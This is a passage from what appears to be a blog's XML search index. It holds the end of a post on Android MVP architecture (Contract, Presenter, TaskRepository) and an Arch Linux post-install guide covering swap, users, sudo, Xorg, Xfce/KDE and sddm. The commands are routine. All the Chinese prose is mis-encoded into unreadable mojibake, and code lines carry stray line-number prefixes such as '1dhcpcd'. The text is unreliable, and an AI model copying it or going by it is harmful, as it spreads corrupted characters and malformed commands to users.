tasksåŒ…æ•´ä¸ªappä¸­tasksã€taskdetailã€statisticsä¸‰ä¸ªåŒ…å¯¹åº”ç€çš„å°±æ˜¯ä¸‰ä¸ªActivityï¼Œå¯ä»¥çœ‹åˆ°æ¯ä¸€ä¸ªåŒ…ä¸­åŒ…å«äº†å¯¹åº”çš„Activityã€View ã€Presenterä¸ŽContractç±»å’Œå…¶ä»–å·¥å…·ç»„ä»¶ï¼Œé€šè¿‡è¿™æ ·çš„æ–¹å¼æž„æˆäº†åº”ç”¨çš„ä¸€ä¸ªç»„æˆå•å…ƒï¼ˆæ¯ä¸€ä¸ªActivityä¸Žå…¶å¯¹åº”çš„Viewå’Œå®žçŽ°é€»è¾‘çš„Presenterï¼‰ã€‚ å›¾ä¸­æˆ‘åªå±•çŽ°äº†tasksè¿™ä¸€ä¸ªåŒ…ï¼Œå…¶ä»–çš„åŒ…å†…éƒ¨çš„ç»“æž„ä¹Ÿæ˜¯ä¸€æ ·çš„ã€‚ TasksContractæŽ¥å£TasksContractæŽ¥å£åŒ…å«ä¸¤ä¸ªæŽ¥å£ï¼Œåˆ†åˆ«æ˜¯ç»§æ‰¿äº†BaseViewä¸ŽBasePresenterçš„Viewä¸ŽPresenterã€‚ æˆ‘ä»¬å¯ä»¥å°†ContractæŽ¥å£è§†ä¸ºç®¡ç†Viewä¸ŽPresenteréœ€è¦å®žçŽ°çš„æ–¹æ³•çš„æ±‡æ€»æŽ¥å£ï¼Œè¿™äº›æ–¹æ³•åœ¨å®žä¾‹ç±»ä¸­å®žé™…ä¸Šéƒ½æ˜¯é€šè¿‡æŽ¥å£æ¥è¿›è¡Œè°ƒç”¨çš„ï¼Œè¿™æ ·å°±å¯ä»¥é¿å…ä¾èµ–äºŽæŸä¸€ä¸ªç‰¹å®šç±»çš„æ–¹æ³•æ¥è¿›è¡Œå¤„ç†ï¼Œä»Žè€Œå¯ä»¥æœ‰å¤šç§å®žçŽ°Viewä¸ŽPresenterçš„æ–¹å¼ï¼Œä¾¿äºŽè¿›è¡Œå•å…ƒæµ‹è¯•ï¼ˆå¯ä»¥çœ‹åˆ°æºä»£ç ä¸­å°±æœ‰å¾ˆå¤šå•å…ƒæµ‹è¯•çš„å†…å®¹ï¼Œä½†æ˜¯åœ¨è¿™ç¯‡æ–‡ç« ä¸­æˆ‘ä»¬å°†å®ƒä»¬å¿½ç•¥ï¼‰ã€‚ ä¸€åˆ‡ä¸Žæ›´æ–°UIæœ‰å…³çš„é€»è¾‘éƒ½åº”è¯¥æ”¾åœ¨TasksContract.ViewæŽ¥å£ä¸­ã€‚ ä¸€åˆ‡ä¸Žä¸šåŠ¡æœ‰å…³çš„é€»è¾‘éƒ½åº”è¯¥æ”¾åœ¨TaskContract.PresenteræŽ¥å£ä¸­ã€‚ TasksFragmentä¸ŽTasksPresenterTasksFragmentä¸ŽTaskPresenteråˆ†åˆ«æ˜¯TasksContract.Viewä¸ŽTaskContract.PresenteræŽ¥å£çš„å®žä¾‹ã€‚ TaskActivityåœ¨åˆå§‹åŒ–æ—¶ä¼šå…ˆåˆ›å»ºTasksFragmentå®žä¾‹ï¼Œå†å°†å…¶ä½œä¸ºæž„é€ å‚æ•°ä¼ é€’ç»™TaskPresenterï¼ŒTaskPresenteråœ¨æž„é€ æ–¹æ³•ä¸­åˆä¼šè°ƒç”¨TasksFragmentçš„setPresenteræ–¹æ³•å°†è‡ªèº«ä¼ é€’ç»™TasksFragmentã€‚è¿™æ ·Presenterä¸ŽViewå°±åˆ†åˆ«å­˜æœ‰äº†ä¸€ä»½å¯¹æ–¹çš„å¼•ç”¨ã€‚ æž„é€ å®ŒæˆåŽï¼Œå½“ç”¨æˆ·ä¸ŽUIè¿›è¡Œäº¤äº’ï¼ŒViewä¸€å¾‹è°ƒç”¨Presenterçš„ç›¸å…³æ–¹æ³•æ¥è¿›è¡Œäº¤äº’äº‹ä»¶çš„å¤„ç†æˆ–è¯·æ±‚æ•°æ®æ›´æ–°ã€‚å¦‚æžœæœ‰æ–°çš„å†…å®¹éœ€è¦å‘ˆçŽ°åœ¨UIä¸Šï¼Œåˆ™ç”±Presenterè°ƒç”¨Viewçš„ç›¸å…³æ–¹æ³•æ¥è¿›è¡Œæ›´æ–°ã€‚Presenteråˆ™è´Ÿè´£ä¸Žä¸Šä¸€çº§çš„æ•°æ®å­˜å‚¨æ± è¿›è¡Œäº¤äº’æ¥æ›´æ–°æ•°æ®æˆ–æ˜¯èŽ·å–æ–°çš„æ•°æ®ã€‚ å¯ä»¥çœ‹åˆ°Presenterå……å½“äº†ä¸€ä¸ªâ€œä¸­ä»‹â€ï¼ŒViewçš„æ‰€æœ‰è¯·æ±‚éƒ½å°†äº¤ç”±Presenterè¿›è¡Œå¤„ç†ï¼Œè€ŒViewçŽ°åœ¨éœ€è¦åšçš„åªæœ‰æä¾›ç›¸åº”æ–¹æ³•ä¾›Presenterè¿›è¡Œè°ƒç”¨ï¼Œé¿å…äº†å°†å¤§é‡ä¸šåŠ¡é€»è¾‘å†™åœ¨Viewä¸­ã€‚åŒæ—¶ä¹Ÿé¿å…äº†Viewä¸Žæ•°æ®çš„ç›´æŽ¥äº¤äº’ï¼Œè€Œæ˜¯ç”±Presenterâ€œå•çº¿æ“ä½œâ€ï¼Œé™ä½Žäº†è€¦åˆåº¦ã€‚ DataåŒ…Taskè¿™é‡Œçš„Taskæ˜¯ä¸€ä¸ªPOJOç±»ï¼Œç”¨äºŽè¡¨ç¤ºå‚¨å­˜çš„æ•°æ®ã€‚ sourceåŒ…TaskDataSourceæŽ¥å£TaskDataSourceæŽ¥å£å®šä¹‰äº†æ‰€æœ‰å¯ä»¥çš„ç”¨äºŽæ“ä½œæ•°æ®çš„å¯¹è±¡çš„æ–¹æ³•ï¼Œæ¢å¥è¯è¯´ï¼Œæ— è®ºæ•°æ®çš„æ¥æºæ˜¯ä»€ä¹ˆï¼Œæˆ‘ä»¬éƒ½å¯ä»¥é€šè¿‡è°ƒç”¨å®žçŽ°äº†è¿™ä¸ªæŽ¥å£çš„å¯¹è±¡çš„æ–¹æ³•æ¥æ“çºµæ•°æ®ã€‚ GetTaskCallbackä¸ŽLoadTasksCallbackæ³¨æ„åˆ°ç”¨äºŽèŽ·å–æ•°æ®çš„æ–¹æ³•çš„å‚æ•°éƒ½åˆ©ç”¨äº†callbackè¿›è¡Œå›žè°ƒæ¥ä¼ é€’æ•°æ®ã€‚è¿™æ ·åšä¸»è¦å› ä¸ºæ•°æ®çš„èŽ·å–æœ‰å¯èƒ½æ˜¯å¼‚æ­¥çš„ï¼Œä½¿ç”¨å›žè°ƒæœºåˆ¶å¯ä»¥é¿å…çº¿ç¨‹å› ä¸ºç­‰å¾…æ•°æ®è€Œé˜»å¡žã€‚ localåŒ…ä¸ŽremoteåŒ…è¿™ä¸¤ä¸ªåŒ…åˆ†åˆ«å­˜æ”¾ç€ä¸€ä¸ªå®žçŽ°äº†TaskDataSourceæŽ¥å£çš„ç±»ï¼Œä»–ä»¬å°±ä»£è¡¨äº†ä»Žæœ¬åœ°ç¼“å­˜èŽ·å–æ•°æ®ä¸Žä»Žè¿œç«¯èŽ·å–æ•°æ®ã€‚å½“ç„¶ä¸ŽèŽ·å–æ•°æ®æœ‰å…³çš„å…¶ä»–ç±»ä¹Ÿåº”è¯¥æ”¾åœ¨è¿™ä¸ªåŒ…ä¸‹ã€‚ TaskRepositoryæœ‰äº†ä»Žæœ¬åœ°ä¸Žè¿œç«¯èŽ·å–æ•°æ®çš„ç±»ï¼Œé‚£ä¹ˆå°±åº”è¯¥æœ‰ä¸€ä¸ªç±»å¯¹å®ƒä»¬è¿›è¡Œç®¡ç†ï¼Œæˆ‘ä»¬å¸Œæœ›çš„æ˜¯æœ‰æœ¬åœ°ç¼“å­˜æ—¶è¯»å–æœ¬åœ°ç¼“å­˜ï¼Œæ²¡æœ‰æ—¶å°±ä»Žè¿œç«¯çš„èŽ·å–æ•°æ®ã€‚åœ¨æ›´ä¸ºå¤æ‚çš„æƒ…å†µä¸‹ï¼Œæˆ‘ä»¬éœ€è¦å¤„ç†æ¥è‡ªè¿œç«¯çš„è¯·æ±‚å¹¶ä¸Žæœ¬åœ°çš„æ•°æ®è¿›è¡ŒåŒæ­¥ã€‚ TaskRepositoryå°±æ˜¯ç”¨äºŽç®¡ç†æ‰€æœ‰çš„è¿™äº›æ•°æ®æ¥æºå¹¶ç»Ÿä¸€æˆä¸€ä¸ªTaskDataSourceæš´éœ²ç»™Presenteræ¥æ“ä½œæ•°æ®ï¼Œè€Œè¿™äº›æ•°æ®ç®¡ç†é€»è¾‘å°±è¢«éšè—åœ¨äº†TaskRepositoryä¸­ã€‚ å€¼å¾—æ³¨æ„çš„æ˜¯ï¼Œæºç ä¸­åœ¨TaskRepositoryä¸­è¿˜å®žçŽ°äº†ä¸€ä¸ªå†…å­˜ç¼“å­˜ï¼Œå¯ä»¥é¿å…ä»Žå…¶ä»–ä¸¤ä¸ªä½Žé€Ÿæ¥æºä¸­èŽ·å–æ•°æ®ã€‚]]></content>
      <categories>
        <category>Android</category>
        <category>Architecture</category>
      </categories>
      <tags>
        <tag>Android</tag>
        <tag>MVP</tag>
        <tag>Architecture</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ArchLinuxå®‰è£…åŽçš„å¿…é¡»é…ç½®ä¸Žå›¾å½¢ç•Œé¢å®‰è£…æ•™ç¨‹]]></title>
    <url>%2F2017%2F05%2F19%2Farch_setup%2F</url>
    <content type="text"><![CDATA[ArchLinuxå®‰è£…åŽçš„å¿…é¡»é…ç½®åœ¨ä¸Šä¸€ç¯‡æ•™ç¨‹ä¸­ï¼Œæˆ‘ä»¬æˆåŠŸåœ°å®‰è£…äº†ArchLinuxï¼Œè¿™æ—¶ç³»ç»Ÿå¤„äºŽä¸€ä¸ªéžå¸¸ç²¾ç®€çš„çŠ¶æ€ï¼Œä¸ºäº†æ—¥å¸¸ä½¿ç”¨ï¼Œæˆ‘ä»¬å¿…é¡»è¿›è¡Œä¸€äº›é…ç½®ã€å®‰è£…ä¸€äº›éœ€è¦çš„ç»„ä»¶ï¼Œæ¥æ‰©å±•æˆ‘ä»¬çš„ç³»ç»ŸåŠŸèƒ½ï¼Œå¼€æºçš„ç»„ä»¶ç›¸äº’ååŒå·¥ä½œä¹Ÿæ˜¯Linuxçš„è¿·äººä¹‹å¤„ä¹‹ä¸€ã€‚ ä¸‹é¢çš„æ•™ç¨‹éƒ¨åˆ†å‚è€ƒäº†å®˜æ–¹General recommendationsã€‚ è¿žæŽ¥ç½‘ç»œçŽ°åœ¨æˆ‘ä»¬æ˜¯åœ¨æ–°å®‰è£…çš„ç³»ç»Ÿä¸Šè¿›è¡Œæ“ä½œï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é‡æ–°è”ç½‘ï¼Œæˆ‘ä»¬åœ¨ä¹‹å‰å®‰è£…ç³»ç»Ÿæ—¶å·²ç»æå‰è£…å¥½äº†ç›¸å…³çš„åŒ…ã€‚æ‰€ä»¥çŽ°åœ¨åªè¦è·Ÿä¹‹å‰ä¸€æ ·ï¼š å¦‚æžœä½ æ˜¯æœ‰çº¿ç½‘å¹¶ä¸”è·¯ç”±å™¨æ”¯æŒDHCPçš„è¯æ’ä¸Šç½‘çº¿åŽå…ˆæ‰§è¡Œä»¥ä¸‹å‘½ä»¤èŽ·å–IPåœ°å€ï¼š 1dhcpcd æ— çº¿ç½‘ï¼š 1wifi-menu æŒ‰ç•Œé¢æç¤ºè¿›è¡Œæ“ä½œå°±å¯ä»¥äº†ã€‚ åŒæ ·å¯ä»¥ä½¿ç”¨pingå‘½ä»¤æ¥æµ‹è¯•æ˜¯å¦æ­£å¸¸è”ç½‘ã€‚ åˆ›å»ºäº¤æ¢æ–‡ä»¶äº¤æ¢æ–‡ä»¶å¯ä»¥åœ¨ç‰©ç†å†…å­˜ä¸è¶³çš„æ—¶å€™å°†éƒ¨åˆ†å†…å­˜æš‚å­˜åˆ°äº¤æ¢æ–‡ä»¶ä¸­ï¼Œé¿å…ç³»ç»Ÿç”±äºŽå†…å­˜ä¸è¶³è€Œå®Œå…¨åœæ­¢å·¥ä½œã€‚ ä¹‹å‰æˆ‘ä»¬é€šå¸¸é‡‡ç”¨å•ç‹¬ä¸€ä¸ªåˆ†åŒºçš„æ–¹å¼ä½œä¸ºäº¤æ¢åˆ†åŒºï¼ŒçŽ°åœ¨æ›´æŽ¨èé‡‡ç”¨äº¤æ¢æ–‡ä»¶çš„æ–¹å¼ï¼Œæ›´ä¾¿äºŽæˆ‘ä»¬çš„ç®¡ç†ã€‚ åˆ†é…ä¸€å—ç©ºé—´ç”¨äºŽäº¤æ¢æ–‡ä»¶ï¼Œæ‰§è¡Œï¼š 1fallocate -l 512M /swapfile ï¼ˆè¯·å°†512Mæ¢æˆéœ€è¦çš„å¤§å°ï¼Œåªèƒ½ä»¥Mæˆ–Gä¸ºå•ä½ï¼‰ äº¤æ¢æ–‡ä»¶çš„å¤§å°å¯ä»¥è‡ªå·±å†³å®šï¼ŒæŽ¨è4Gä»¥ä¸‹çš„ç‰©ç†å†…å­˜ï¼Œäº¤æ¢æ–‡ä»¶ä¸Žç‰©ç†å†…å­˜ä¸€è‡´ï¼Œ4Gä»¥ä¸Šçš„ç‰©ç†å†…å­˜ï¼Œäº¤æ¢æ–‡ä»¶4-8Gã€‚ æ›´æ”¹æƒé™ï¼Œæ‰§è¡Œï¼š 1chmod 600 /swapfile è®¾ç½®äº¤æ¢æ–‡ä»¶ï¼Œæ‰§è¡Œï¼š 1mkswap /swapfile å¯ç”¨äº¤æ¢æ–‡ä»¶ï¼Œæ‰§è¡Œï¼š 1swapon /swapfile æœ€åŽæˆ‘ä»¬éœ€è¦ç¼–è¾‘/etc/fstabä¸ºäº¤æ¢æ–‡ä»¶è®¾ç½®ä¸€ä¸ªå…¥å£ï¼Œä½¿ç”¨vimæ‰“å¼€æ–‡ä»¶ï¼š 1vim /etc/fstab æ³¨æ„ç¼–è¾‘fstabæ–‡ä»¶çš„æ—¶å€™è¦æ ¼å¤–æ³¨æ„ä¸è¦ä¿®æ”¹ä¹‹å‰çš„å†…å®¹ï¼Œç›´æŽ¥åœ¨æœ€åŽæ–°èµ·ä¸€è¡ŒåŠ å…¥ä»¥ä¸‹å†…å®¹ï¼š 1/swapfile none swap defaults 0 0 æ–°å»ºç”¨æˆ·åœ¨è¿™ä¹‹å‰æ‰€æœ‰æ“ä½œéƒ½æ˜¯ä»¥rootç”¨æˆ·çš„èº«ä»½è¿›è¡Œçš„ï¼Œç”±äºŽrootçš„æƒé™è¿‡é«˜ï¼Œæ—¥å¸¸ä½¿ç”¨rootç”¨æˆ·æ˜¯ä¸å®‰å…¨çš„ã€‚Linuxä¸ºæˆ‘ä»¬æä¾›äº†å¼ºå¤§çš„ç”¨æˆ·ä¸Žç»„çš„æƒé™ç®¡ç†ï¼Œæé«˜äº†æ•´ä¸ªç³»ç»Ÿçš„å®‰å…¨æ€§ã€‚è¿™é‡Œæˆ‘ä»¬å°±æ¥æ–°å»ºä¸€ä¸ªç”¨æˆ·ã€‚ æ‰§è¡Œä»¥ä¸‹å‘½ä»¤æ¥åˆ›å»ºä¸€ä¸ªåä¸ºusernameçš„ç”¨æˆ·ï¼ˆè¯·è‡ªè¡Œæ›¿æ¢usernameä¸ºä½ çš„ç”¨æˆ·åï¼‰ï¼š 1useradd -m -G wheel username ï¼ˆè¯·è‡ªè¡Œæ›¿æ¢usernameä¸ºä½ çš„ç”¨æˆ·åï¼‰ åœ¨è¿™é‡Œç¨å¾®è§£é‡Šä¸€ä¸‹å„å‚æ•°çš„å«ä¹‰ï¼š -mï¼šåœ¨åˆ›å»ºæ—¶åŒæ—¶åœ¨/homeç›®å½•ä¸‹åˆ›å»ºä¸€ä¸ªä¸Žç”¨æˆ·ååŒåçš„æ–‡ä»¶å¤¹ï¼Œè¿™ä¸ªç›®å½•å°±æ˜¯ä½ çš„å®¶ç›®å½•å•¦ï¼å®¶ç›®å½•æœ‰ä¸€ä¸ªåˆ«åæ˜¯~ï¼Œä½ å¯ä»¥åœ¨ä»»ä½•åœ°æ–¹ä½¿ç”¨~æ¥ä»£æ›¿å®¶ç›®å½•è·¯å¾„ã€‚è¿™ä¸ªç¥žå¥‡çš„ç›®å½•å°†ä¼šç”¨äºŽå­˜æ”¾ä½ æ‰€æœ‰çš„ä¸ªäººèµ„æ–™ã€é…ç½®æ–‡ä»¶ç­‰æ‰€æœ‰è·Ÿç³»ç»Ÿæœ¬èº«æ— å…³çš„èµ„æ–™ã€‚è¿™ç§è®¾å®šå¸¦æ¥äº†è¯¸å¤šä¼˜ç‚¹ï¼š åªè¦å®¶ç›®å½•ä¸å˜ï¼Œä½ é‡è£…ç³»ç»ŸåŽåªéœ€è¦é‡æ–°å®‰è£…ä¸€ä¸‹è½¯ä»¶åŒ…ï¼ˆå®ƒä»¬ä¸€èˆ¬ä¸å­˜æ”¾åœ¨å®¶ç›®å½•ï¼‰ï¼Œç„¶åŽæ‰€æœ‰çš„é…ç½®éƒ½ä¼šä»Žå®¶ç›®å½•ä¸­è¯»å–ï¼Œå®Œå…¨ä¸ç”¨é‡æ–°è®¾ç½®è½¯ä»¶ç€ã€‚ ä½ å¯ä»¥åœ¨å®¶ç›®å½•ä¸å˜çš„æƒ…å†µä¸‹æ›´æ¢ä½ çš„å‘è¡Œç‰ˆè€Œä¸ç”¨é‡æ–°é…ç½®ä½ çš„çŽ¯å¢ƒã€‚ åˆ‡æ¢ç”¨æˆ·åŽæ‰€æœ‰çš„è®¾ç½®ä¼šä»Žæ–°çš„ç”¨æˆ·çš„å®¶ç›®å½•ä¸­è¯»å–ï¼Œå°†ä¸åŒç”¨æˆ·çš„èµ„æ–™ä¸Žè½¯ä»¶è®¾ç½®ç­‰å®Œå…¨éš”ç¦»ã€‚ æœ‰äº›è‘—åçš„é…ç½®æ–‡ä»¶æ¯”å¦‚vimçš„é…ç½®æ–‡ä»¶~/.vimrcï¼Œåªè¦æ ¹æ®è‡ªå·±çš„ä½¿ç”¨ä¹ æƒ¯é…ç½®ä¸€æ¬¡ï¼Œ åœ¨å¦ä¸€ä¸ªLinuxç³»ç»Ÿä¸‹ï¼ˆä¾‹å¦‚ä½ çš„æœåŠ¡å™¨ï¼‰æŠŠè¿™ä¸ªæ–‡ä»¶å¤åˆ¶åˆ°å®¶ç›®å½•ä¸‹ï¼Œå°±å¯ä»¥å®Œå…¨æ¢å¤ä½ çš„é…ç½®ã€‚ -G wheelï¼š-Gä»£è¡¨æŠŠç”¨æˆ·åŠ å…¥ä¸€ä¸ªç»„ï¼Œå¯¹ç”¨æˆ·ä¸Žç»„çš„æ¦‚å¿µæ„Ÿå…´è¶£çš„åŒå­¦å¯ä»¥è‡ªè¡ŒæŸ¥æ‰¾æœ‰å…³èµ„æ–™å­¦ä¹ ã€‚åŽé¢è·Ÿç€çš„wheelå°±æ˜¯åŠ å…¥çš„ç»„åï¼Œè‡³äºŽä¸ºä»€ä¹ˆè¦åŠ å…¥è¿™ä¸ªç»„ï¼ŒåŽé¢ä¼šæåˆ°ã€‚ å½“ç„¶è®°å¾—ä¸ºæ–°ç”¨æˆ·è®¾ç½®ä¸€ä¸ªå¯†ç ï¼Œæ‰§è¡Œå¦‚ä¸‹å‘½ä»¤ï¼š 1passwd username ï¼ˆè¯·è‡ªè¡Œæ›¿æ¢usernameä¸ºä½ çš„ç”¨æˆ·åï¼‰ æ ¹æ®æç¤ºè¾“å…¥ä¸¤æ¬¡å¯†ç å°±å¯ä»¥äº†ï¼Œæ³¨æ„ï¼Œè¿™æ˜¯ä½ çš„ç”¨æˆ·å¯†ç ï¼ŒæŽ¨èä¸Žä¹‹å‰è®¾ç½®çš„rootç”¨æˆ·çš„å¯†ç ä¸åŒã€‚ é…ç½®sudoæˆ‘ä»¬å·²ç»åˆ›å»ºå¥½äº†ä¸€ä¸ªæ–°çš„ç”¨æˆ·ï¼Œä»¥åŽæˆ‘ä»¬å°†ä¼šä½¿ç”¨è¿™ä¸ªç”¨æˆ·æ¥ç™»å½•ï¼Œé‚£ä¹ˆå¦‚æžœæˆ‘ä»¬éœ€è¦æ‰§è¡Œä¸€äº›åªæœ‰rootç”¨æˆ·æ‰èƒ½æ‰§è¡Œçš„å‘½ä»¤ï¼ˆä¾‹å¦‚ä¿®æ”¹ç³»ç»Ÿæ–‡ä»¶ã€å®‰è£…è½¯ä»¶åŒ…ï¼‰æ€Žä¹ˆåŠžï¼Ÿå½“ç„¶æˆ‘ä»¬å¯ä»¥é€šè¿‡ 1su å‘½ä»¤æ¥åˆ‡æ¢åˆ°rootç”¨æˆ·æ‰§è¡Œå‘½ä»¤åŽå†é€šè¿‡ 1exit è¿”å›žæ™®é€šç”¨æˆ·ã€‚ ä½†æ˜¯sudoä¸ºæˆ‘ä»¬æä¾›äº†ä¸€ä¸ªæ›´å¿«æ·çš„åŠžæ³•ï¼Œä½¿ç”¨sudoï¼Œæˆ‘ä»¬åªè¦åœ¨éœ€è¦rootæƒæƒé™æ‰§è¡Œçš„å‘½ä»¤ä¹‹å‰åŠ ä¸Šsudoå°±å¯ä»¥äº†ï¼Œä¾‹å¦‚å®‰è£…è½¯ä»¶åŒ…ï¼š 1sudo pacman -S something ä¸‹é¢æˆ‘ä»¬å°±æ¥å®‰è£…å¹¶é…ç½®sudoã€‚ sudoæœ¬èº«ä¹Ÿæ˜¯ä¸€ä¸ªè½¯ä»¶åŒ…ï¼Œæ‰€ä»¥æˆ‘ä»¬éœ€è¦é€šè¿‡pacmanæ¥å®‰è£…ï¼š 1pacman -S sudo æŽ¥ä¸‹æ¥æˆ‘ä»¬éœ€è¦ç”¨ä¸“é—¨çš„visudoå‘½ä»¤æ¥ç¼–è¾‘sudoçš„é…ç½®æ–‡ä»¶ï¼š 1visudo å®žé™…ä¸Šå°±æ˜¯vimçš„æ“ä½œï¼Œä½¿ç”¨å®ƒæ˜¯ä¸ºäº†å¯¹ç¼–è¾‘åŽçš„æ–‡ä»¶è¿›è¡Œæ£€æŸ¥é˜²æ­¢æ ¼å¼çš„é”™è¯¯ã€‚ æ‰¾åˆ° 1# %wheel ALL=(ALL)ALL è¿™è¡Œï¼ŒåŽ»æŽ‰ä¹‹å‰çš„#æ³¨é‡Šç¬¦ï¼Œä¿å­˜å¹¶é€€å‡ºå°±å¯ä»¥äº†ã€‚ è¿™é‡Œçš„%wheelå°±æ˜¯ä»£è¡¨wheelç»„ï¼Œæ„å‘³ç€wheelç»„ä¸­çš„æ‰€æœ‰ç”¨æˆ·éƒ½å¯ä»¥ä½¿ç”¨sudoå‘½ä»¤ã€‚ å½“ç„¶ä¸ºäº†å®‰å…¨ä½¿ç”¨sudoå‘½ä»¤è¿˜æ˜¯éœ€è¦è¾“å…¥å½“å‰ç”¨æˆ·çš„å¯†ç çš„ã€‚ é…ç½®å¥½sudoä»¥åŽï¼Œæˆ‘ä»¬è¿›è¡Œä¸€æ¬¡é‡å¯ï¼Œæ‰§è¡Œï¼š 1reboot æ¥é‡å¯ä½ çš„ç”µè„‘ã€‚ é‡å¯ä»¥åŽè¾“å…¥ä½ åˆšåˆ›å»ºçš„ç”¨æˆ·åä¸Žå¯†ç æ¥ç™»å½•ã€‚æ³¨æ„ç™»å½•åŽè¦é‡æ–°è¿›è¡Œè”ç½‘æ“ä½œã€‚ å›¾å½¢ç•Œé¢çš„å®‰è£…æ˜¾å¡é©±åŠ¨çš„å®‰è£… å‚ç…§è¿™ä¸ªè¡¨æ ¼ï¼Œå®‰è£…ç›¸åº”çš„åŒ…ï¼Œæ¯”å¦‚ä½ æ˜¯intelçš„é›†æˆæ˜¾å¡ï¼ˆç»å¤§å¤šæ•°äººçš„æƒ…å†µï¼‰ï¼Œæ‰§è¡Œï¼š 1sudo pacman -S xf86-video-intel æç¤ºï¼šNvidiaçš„ç‹¬æ˜¾é©±åŠ¨å¦‚éžå¿…è¦ï¼Œå»ºè®®åªè£…é›†æˆæ˜¾å¡çš„é©±åŠ¨ï¼ˆçœç”µï¼Œå¦‚æžœåŒæ—¶è£…ä¹Ÿä¼šé»˜è®¤ä½¿ç”¨é›†æˆæ˜¾å¡ï¼‰ï¼Œä¸å®¹æ˜“å‡ºçŽ°å†²çªé—®é¢˜ã€‚ç›¸åï¼Œå¦‚æžœé›†æˆæ˜¾å¡é©±åŠ¨æœ‰é—®é¢˜æ— æ³•è£…ä¸Šï¼Œå¯ä»¥è£…ç‹¬æ˜¾é©±åŠ¨ï¼Œå…·ä½“çš„ç‰ˆæœ¬è¯·åˆ°ä¸‹é¢çš„é“¾æŽ¥æŸ¥è¯¢ï¼š https://wiki.archlinux.org/index.php/Xorg#Driver_installation å®‰è£…XorgXorgæ˜¯Linuxä¸‹çš„ä¸€ä¸ªè‘—åçš„å¼€æºå›¾å½¢æœåŠ¡ï¼Œæˆ‘ä»¬çš„æ¡Œé¢çŽ¯å¢ƒéœ€è¦Xorgçš„æ”¯æŒã€‚ æ‰§è¡Œå¦‚ä¸‹å‘½ä»¤å®‰è£…XorgåŠç›¸å…³ç»„ä»¶ï¼š 1sudo pacman -S xorg å®‰è£…æ¡Œé¢çŽ¯å¢ƒLinuxä¸‹æœ‰å¾ˆå¤šè‘—åçš„æ¡Œé¢çŽ¯å¢ƒå¦‚Xfceã€KDE(Plasma)ã€Gnomeã€Unityã€Deepinç­‰ç­‰ï¼Œå®ƒä»¬çš„å¤–è§‚ã€æ“ä½œã€è®¾è®¡ç†å¿µç­‰å„æ–¹é¢éƒ½æœ‰æ‰€ä¸åŒï¼Œ åœ¨å®ƒä»¬ä¹‹é—´çš„æ¯”è¾ƒä¸Žé€‰æ‹©ç½‘ä¸Šæœ‰å¾ˆå¤šçš„èµ„æ–™å¯ä»¥åŽ»æŸ¥ã€‚ åœ¨è¿™é‡Œæˆ‘ä»¬é€‰æ‹©ç¬”è€…ä½¿ç”¨çš„Xfceå’Œéžå¸¸æµè¡Œçš„KDE(Plasma)ä½œä¸ºç¤ºèŒƒï¼Œå½“ç„¶ä½ ä¹Ÿå¯ä»¥æŠŠå®ƒä»¬å…¨éƒ¨è£…ä¸Šæ¢ç€ç”¨â€¦â€¦å› ä¸ºLinuxçš„æ¨¡å—åŒ–ï¼Œè¿™æ ·å®Œå…¨æ²¡æœ‰é—®é¢˜ã€‚ æ›´å¤šæ¡Œé¢çŽ¯å¢ƒçš„å®‰è£…æŒ‡å—è¯·è§ä¸‹é¢çš„é“¾æŽ¥ï¼š https://wiki.archlinux.org/index.php/Desktop_environment#List_of_desktop_environments å®‰è£…Xfceç›´æŽ¥å®‰è£…è½¯ä»¶åŒ…ç»„ï¼ˆåŒ…å«äº†å¾ˆå¤šè½¯ä»¶åŒ…ï¼‰å³å¯ï¼š 1sudo pacman -S xfce4 xfce4-goodies å®‰è£…KDE(Plasma)ç›´æŽ¥å®‰è£…è½¯ä»¶åŒ…ç»„ï¼ˆåŒ…å«äº†å¾ˆå¤šè½¯ä»¶åŒ…ï¼‰å³å¯ï¼š 1sudo pacman -S plasma kde-applications kde-l10n-zh_cn å®‰è£…æ¡Œé¢ç®¡ç†å™¨å®‰è£…å¥½äº†æ¡Œé¢çŽ¯å¢ƒåŒ…ä»¥åŽï¼Œæˆ‘ä»¬éœ€è¦å®‰è£…ä¸€ä¸ªå›¾å½¢åŒ–çš„æ¡Œé¢ç®¡ç†å™¨æ¥å¸®åŠ©æˆ‘ä»¬ç™»å½•å¹¶ä¸”é€‰æ‹©æˆ‘ä»¬ä½¿ç”¨çš„æ¡Œé¢çŽ¯å¢ƒï¼Œè¿™é‡Œæˆ‘æŽ¨èä½¿ç”¨sddmã€‚ å®‰è£…sddmæ‰§è¡Œï¼š 1sudo pacman -S sddm è®¾ç½®å¼€æœºå¯åŠ¨sddmæœåŠ¡è¿™é‡Œå°±è¦ä»‹ç»ä¸€ä¸‹Archä¸‹ç”¨äºŽç®¡ç†ç³»ç»ŸæœåŠ¡çš„å‘½ä»¤systemctläº†ï¼ŒæœåŠ¡çš„ä½œç”¨å°±æ˜¯å­—é¢æ„æ€ï¼Œä¸ºæˆ‘ä»¬æä¾›ç‰¹å®šçš„æœåŠ¡ï¼Œæ¯”å¦‚sddmå°±ä¸ºæˆ‘ä»¬æä¾›äº†å¯åŠ¨xorgä¸Žç®¡ç†æ¡Œé¢çŽ¯å¢ƒçš„æœåŠ¡ã€‚ å‘½ä»¤çš„ä½¿ç”¨å¹¶ä¸å¤æ‚ï¼š 1234sudo systemctl start æœåŠ¡å ï¼ˆå¯åŠ¨ä¸€é¡¹æœåŠ¡ï¼‰sudo systemctl stop æœåŠ¡å ï¼ˆåœæ­¢ä¸€é¡¹æœåŠ¡ï¼‰sudo systemctl enable æœåŠ¡å ï¼ˆå¼€æœºå¯åŠ¨ä¸€é¡¹æœåŠ¡ï¼‰sudo systemctl disable æœåŠ¡å ï¼ˆå–æ¶ˆå¼€æœºå¯åŠ¨ä¸€é¡¹æœåŠ¡ï¼‰ æ‰€ä»¥è¿™é‡Œæˆ‘ä»¬å°±æ‰§è¡Œä¸‹é¢å‘½ä»¤æ¥è®¾ç½®å¼€æœºå¯åŠ¨sddmï¼š 1sudo systemctl enable sddm 